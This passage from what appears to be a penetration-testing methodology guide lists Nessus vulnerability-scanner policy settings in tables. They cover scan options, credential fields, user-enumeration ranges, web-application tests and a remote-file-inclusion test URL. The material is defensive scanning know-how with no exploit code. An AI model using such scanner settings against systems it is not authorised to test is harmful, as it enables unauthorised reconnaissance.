<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>ICCP/COTP TSAP Addressing</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Start COTP TSAP</td>
<td>8</td>
</tr>
<tr class="row-odd"><td>Stop COTP TSAP</td>
<td>8</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Login configurations</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>HTTP account</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>HTTP password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>NNTP account</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>NNTP password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>FTP account</td>
<td>Anonymous</td>
</tr>
<tr class="row-odd"><td>FTP password (sent in clear)</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>FTP writeable directory</td>
<td>/incoming</td>
</tr>
<tr class="row-odd"><td>POP2 account</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>POP2 password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>POP3 account</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>POP3 password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>IMAP account</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>IMAP password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Modbus/TCP Coil Access</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start reg</td>
<td>0</td>
</tr>
<tr class="row-even"><td>End reg</td>
<td>16</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Nessus SYN scanner</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Firewall detection</td>
<td>Automatic (normal)</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Nessus TCP scanner</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Firewall detection</td>
<td>Automatic (normal)</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>News Server (NNTP) Information Disclosure</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>From address</td>
<td>Nessus &lt;<a class="reference external" href="mailto:listme&#37;&#52;&#48;listme&#46;dsbl&#46;org">listme<span>&#64;</span>listme<span>&#46;</span>dsbl<span>&#46;</span>org</a>&gt;</td>
</tr>
<tr class="row-even"><td>Test group name regex</td>
<td>f[a-z]\.tests?</td>
</tr>
<tr class="row-odd"><td>Max crosspost</td>
<td>7</td>
</tr>
<tr class="row-even"><td>Local distribution</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>No archive</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Nikto (NASL wrapper)</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Enable Nikto</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Disable if server never replies 404</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Root directory</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Pause between tests (s)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Scan CGI directories</td>
<td>User supplied</td>
</tr>
<tr class="row-odd"><td>Display: 1 Show redirects</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Display: 2 Show cookies received</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Display: 3 Show all 200/OK responses</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Display: 4 Show URLs which require authentication</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Display: V Verbose Output</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Tuning: 1 Interesting File/Seen in logs</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Tuning: 2 Misconfiguration / Default File</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Tuning: 3 Information Disclosure</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Tuning: 4 Injection (XSS/Script/HTML)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Oracle Settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Oracle SID</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Test default accounts (slow)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>PCI DSS Compliance</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Check for PCI-DSS compliance</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Ping the remote host</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>TCP ping destination port(s)</td>
<td>Built-in</td>
</tr>
<tr class="row-even"><td>Do an ARP ping</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Do a TCP ping</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Do an ICMP ping</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Number of Retries (ICMP)</td>
<td>2</td>
</tr>
<tr class="row-even"><td>Do an applicative UDP ping (DNS, RPCÖ)</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Make the dead hosts appear in the report</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Log live hosts in the report</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Test the local Nessus host</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Fast network discovery</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Port scanners settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Check open TCP ports found by local port enumerators</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Only run network port scanners if local port enumeration failed</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMB Registry: Start the Registry Service during the scan</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start the Registry Service during the scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>SMB Scope</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Request information about the domain</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMB use domain SID to enumerate users</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start UID</td>
<td>1000</td>
</tr>
<tr class="row-even"><td>End UID</td>
<td>1200</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMB use host SID to enumerate local users</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start UID</td>
<td>1000</td>
</tr>
<tr class="row-even"><td>End UID</td>
<td>1200</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMTP settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Third party domain</td>
<td>Example.com</td>
</tr>
<tr class="row-even"><td>From address</td>
<td><a class="reference external" href="mailto:nobody&#37;&#52;&#48;example&#46;com">nobody<span>&#64;</span>example<span>&#46;</span>com</a></td>
</tr>
<tr class="row-odd"><td>To address</td>
<td>postmaster&#64;[AUTO_REPLACED_IP]</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>SNMP settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Community name</td>
<td>Public</td>
</tr>
<tr class="row-odd"><td>UDP port</td>
<td>161</td>
</tr>
<tr class="row-even"><td>SNMPv3 user name</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SNMPv3 authentication password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SNMPv3 authentication algorithm</td>
<td>MD5</td>
</tr>
<tr class="row-odd"><td>SNMPv3 privacy password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SNMPv3 privacy algorithm</td>
<td>DES</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Service Detection</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Test SSL based services</td>
<td>Known SSL ports</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Unix Compliance Checks</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Web Application Tests Settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Enable web applications tests</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Maximum run time (min)</td>
<td>60</td>
</tr>
<tr class="row-odd"><td>Send POST requests</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Combinations of arguments values</td>
<td>one value</td>
</tr>
<tr class="row-odd"><td>HTTP Parameter Pollution</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Stop at first flaw</td>
<td>Per port (quicker)</td>
</tr>
<tr class="row-odd"><td>Test embedded web servers</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>URL for Remote File Inclusion</td>
<td><a class="reference external" href="http://rfi.nessus.org/rfi.txt">http://rfi.nessus.org/rfi.txt</a></td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Web mirroring</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Number of pages to mirror</td>
<td>1000</td>
</tr>
<tr class="row-even"><td>Maximum depth</td>
<td>6</td>
</tr>
<tr class="row-odd"><td>Start page</td>
<td>/</td>
</tr>
<tr class="row-even"><td>Excluded items regex</td>
<td>/server_privileges\.php</td>
</tr>
<tr class="row-odd"><td>Follow dynamic pages</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Windows Compliance Checks</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Windows File Contents Compliance Checks</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #5</td>
<td>Blank</td>
</tr>
</tbody>
</table>
<div class="line-block">
<div class="line">In order to ensure that all tests are conducted with the same
criteria, you will need to ensure that you have created a policy
called &#8220;Validation Scan.&#8221; In order to do this you will need to connect
to the Nessus server UI, so that you can create a custom policy by
clicking on the &#8220;Policies&#8221; option on the bar at the top and then &#8220;+
Add&#8221; button on the right. The &#8220;Add Policy&#8221; screen will be displayed as
follows:</div>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_164.png">Screenshot Here</a> <a href="#id93"><span class="problematic" id="id94">*</span></a>&#8216;
<a href="#id95"><span class="problematic" id="id96">*</span></a>&#8216;</div>
</div>
</div>
<p>There are four configuration tabs: General, Credentials, Plugins, and
Preferences. For our purposes, most of the default settings do not need
to be modified.</p>
</div>
<div class="section" id="id97">
<h2>General<a class="headerlink" href="#id97" title="Permalink to this headline">¶</a></h2>
<p>The General tab is where we will name and configure scan options related
to our policy. There are six boxes of grouped options that control
scanner behavior: Basic, Scan, Network Congestion, Port Scanners, Port
Scan Options, and Performance.</p>
<p>Basic allows us to define the policy itself. The actual settings have
been defined as indicated below:</p>
<table border="1" class="docutils">
<colgroup>
<col width="33%" />
<col width="67%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Basic Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Name</td>
<td>Validation Scan</td>
</tr>
<tr class="row-odd"><td>Visibility</td>
<td>Shared</td>
</tr>
<tr class="row-even"><td>Description</td>
<td><div class="first last line-block">
<div class="line">Validation Scan Only (Use to check that Nessus is working properly and the signature date)</div>
</div>
</td>
</tr>
<tr class="row-odd"><td><strong>Scan Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Save Knowledge Base</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Safe Checks</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Silent Dependencies</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Log Scan Details to Server</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Stop Host Scan on Disconnect</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Avoid Sequential Scans</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Consider Unscanned Ports as Closed</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Designate Hosts by their DNS Name</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Network Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Reduce Parallel Connections on Congestion</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Use Kernel Congestion Detection (Linux Only)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Port Scanners Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>TCP Scan</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>UDP Scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>SYN Scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>SNMP Scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Netstat SSH Scan</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Netstat WMI Scan</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Ping Host</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Port Scan Options Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Port Scan Range</td>
<td><div class="first last line-block">
<div class="line">22, 161, 1241, 8834</div>
</div>
</td>
</tr>
<tr class="row-even"><td><strong>Performance Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Max Checks Per Host (Windows)</td>
<td>5</td>
</tr>
<tr class="row-even"><td>Max Checks Per Host (Linux)</td>
<td>50-75</td>
</tr>
<tr class="row-odd"><td>Max Hosts Per Scan</td>
<td>1</td>
</tr>
<tr class="row-even"><td>Network Receive Timeout (seconds)</td>
<td>5</td>
</tr>
<tr class="row-odd"><td>Max Simultaneous TCP Sessions Per Host</td>
<td>Unlimited</td>
</tr>
<tr class="row-even"><td>Max Simultaneous TCP Sessions Per Scan</td>
<td>Unlimited</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="id98">
<h2>Credentials<a class="headerlink" href="#id98" title="Permalink to this headline">¶</a></h2>
<p>The Credentials tab, allows us to configure the Nessus scanner to use
authentication credentials during scanning. For our policy we will not
edit any of the settings within this section. They are however
documented to ensure completeness.</p>
<table border="1" class="docutils">
<colgroup>
<col width="71%" />
<col width="29%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Windows credentials</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>SMB account</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SMB password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SMB domain (optional)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SMB password type</td>
<td>Password</td>
</tr>
<tr class="row-even"><td>Additional SMB account (1)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB password (1)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB domain (optional)(1)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB account (2)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB password (2)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB domain (optional)(2)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB account (3)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB password (3)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB domain (optional)(3)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Never send SMB credentials in clear text</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Only use NTLMv2</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>&#8216;&#8217;&#8216;SSH Settings &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>SSH user name</td>
<td>root</td>
</tr>
<tr class="row-even"><td>SSH password (unsafe!)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSH public key to use</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SSH private key to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Passphrase for SSH key</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Elevate privileges with</td>
<td>Nothing</td>
</tr>
<tr class="row-odd"><td>su login</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Escalation password</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSH known_hosts file</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Preferred SSH port</td>
<td>22</td>
</tr>
<tr class="row-odd"><td>Client version</td>
<td>OpenSSH_5.0</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Kerberos configuration</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Kerberos Key Distribution Center (KDC)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Kerberos KDC Port</td>
<td>88</td>
</tr>
<tr class="row-even"><td>Kerberos KDC Transport</td>
<td>UDP</td>
</tr>
<tr class="row-odd"><td>Kerberos Realm (SSH only)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Cleartext protocols settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>User name</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Password (unsafe!)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Try to perform patch level checks over telnet</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Try to perform patch level checks over rsh</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Try to perform patch level checks over rexec</td>
<td>Unchecked</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="id99">
<h2>Plugins<a class="headerlink" href="#id99" title="Permalink to this headline">¶</a></h2>
<p>The Plugins tab, allows us to choose specific security checks by plugin
family or individual checks that we want to enable. The easiest way to
set this is to select the &#8220;Enable All&#8221; button from the main Plugins tab,
however this assumes the Safe Checks is selected from the General Tab.</p>
</div>
<div class="section" id="id100">
<h2>Preferences<a class="headerlink" href="#id100" title="Permalink to this headline">¶</a></h2>
<p>The Preferences tab allows for more granular control over scan settings.
All items in this category should be. The actual settings have been
defined as indicated below:</p>
<table border="1" class="docutils">
<colgroup>
<col width="50%" />
<col width="50%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Cisco IOS Compliance Checks</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>&#8216;&#8217;&#8216;Database Compliance Checks &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>&#8216;&#8217;&#8216;Database Settings &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Login</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>DB Type</td>
<td>Oracle</td>
</tr>
<tr class="row-odd"><td>Database SID</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Database port to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Oracle auth type</td>
<td>NORMAL</td>
</tr>
<tr class="row-even"><td>SQL Server auth type</td>
<td>Windows</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Do not scan fragile devices</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Scan Network Printers</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Scan Novell Netware hosts</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Global variable settings</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Probe services on every port</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td><div class="first last line-block">
<div class="line">Do not log in with user accounts not</div>
<div class="line">specified in the policy</div>
</div>
</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Enable CGI scanning</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Network type</td>
<td>Mixed (use RFC 1918)</td>
</tr>
<tr class="row-odd"><td>Enable experimental scripts</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Thorough tests (slow)</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Report verbosity</td>
<td>Normal</td>
</tr>
<tr class="row-even"><td>Report paranoia</td>
<td>Normal</td>
</tr>
<tr class="row-odd"><td>HTTP User-Agent</td>
<td>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)</td>
</tr>
<tr class="row-even"><td>SSL certificate to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSL CA to trust</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SSL key to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSL password for SSL key</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>HTTP cookies import</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Cookies file</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>HTTP login page</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Login page</td>
<td>/</td>
</tr>
<tr class="row-even"><td>Login form</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Login form fields</td>
<td>user=%USER%&amp;password=%PASS%</td>
</tr>
<tr class="row-even"><td>Login form method</td>
<td>POST</td>
</tr>
<tr class="row-odd"><td>Re-authenticate delay (seconds)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Check authentication on page</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Follow 30x redirections (# of levels)</td>
<td>2</td>
</tr>
<tr class="row-even"><td>Authenticated regex</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Invert test (disconnected if regex matches)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Match regex on HTTP headers</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Case insensitive regex</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>ICCP/COTP TSAP Addressing</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Start COTP TSAP</td>
<td>8</td>
</tr>
<tr class="row-odd"><td>Stop COTP TSAP</td>
<td>8</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Login configurations</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>HTTP account</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>HTTP password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>NNTP account</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>NNTP password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>FTP account</td>
<td>Anonymous</td>
</tr>
<tr class="row-odd"><td>FTP password (sent in clear)</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>FTP writeable directory</td>
<td>/incoming</td>
</tr>
<tr class="row-odd"><td>POP2 account</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>POP2 password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>POP3 account</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>POP3 password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>IMAP account</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>IMAP password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Modbus/TCP Coil Access</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start reg</td>
<td>0</td>
</tr>
<tr class="row-even"><td>End reg</td>
<td>16</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Nessus SYN scanner</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Firewall detection</td>
<td>Automatic (normal)</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Nessus TCP scanner</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Firewall detection</td>
<td>Automatic (normal)</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>News Server (NNTP) Information Disclosure</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>From address</td>
<td>Nessus &lt;<a class="reference external" href="mailto:listme&#37;&#52;&#48;listme&#46;dsbl&#46;org">listme<span>&#64;</span>listme<span>&#46;</span>dsbl<span>&#46;</span>org</a>&gt;</td>
</tr>
<tr class="row-even"><td>Test group name regex</td>
<td>f[a-z]\.tests?</td>
</tr>
<tr class="row-odd"><td>Max crosspost</td>
<td>7</td>
</tr>
